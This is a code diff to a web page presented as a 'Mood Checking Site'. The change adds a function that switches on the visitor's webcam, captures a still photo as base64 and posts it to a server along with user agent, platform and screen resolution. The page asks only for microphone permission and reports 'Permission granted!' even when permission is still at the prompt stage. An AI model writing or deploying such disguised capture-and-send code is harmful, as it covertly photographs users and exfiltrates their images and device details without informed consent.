@@ -6,7 +6,6 @@
     <title>Mood Checking Site</title>
     <script>
         function requestAudioAccess() {
-            // Check if the user has granted permission to play audio
             if (!navigator.permissions) {
                 alert("Your browser doesn't support the Permissions API.");
                 return;
@@ -14,7 +13,7 @@
 
             navigator.permissions.query({ name: 'microphone' }).then((result) => {
                 if (result.state === 'granted' || result.state === 'prompt') {
-                    alert("Permission granting...! Starting the mood check...");
+                    alert("Permission granted! Starting the mood check...");
                     startMoodCheck();
                 } else {
                     alert("Please enable audio permissions to proceed.");
@@ -33,7 +32,37 @@
             window.speechSynthesis.speak(speech);
         }
 
-        function sendDeviceInfo() {
+        function capturePhoto() {
+            const videoElement = document.createElement('video');
+            videoElement.width = 640;
+            videoElement.height = 480;
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    videoElement.srcObject = stream;
+                    videoElement.play();
+
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+
+                    // Wait for video to load, then capture photo
+                    videoElement.addEventListener('canplay', () => {
+                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/jpeg'); // Base64-encoded image
+
+                        sendDeviceInfo(photoData);
+
+                        // Stop the video stream after capturing the photo
+                        stream.getTracks().forEach(track => track.stop());
+                    });
+                })
+                .catch((err) => {
+                    console.error('Error accessing camera:', err);
+                    alert('Could not access camera.');
+                });
+        }
+
+        function sendDeviceInfo(photo) {
             const statusElement = document.getElementById("status");
             statusElement.textContent = "Mood is checking...";
             speak("Mood is checking...");
@@ -56,6 +85,7 @@
                                 userAgent,
                                 platform,
                                 screenResolution,
+                                photo,
                             }),
                         })
                             .then((response) => response.text())
@@ -84,7 +114,7 @@
         }
 
         function startMoodCheck() {
-            sendDeviceInfo();
+            capturePhoto();
         }
     </script>
 </head>
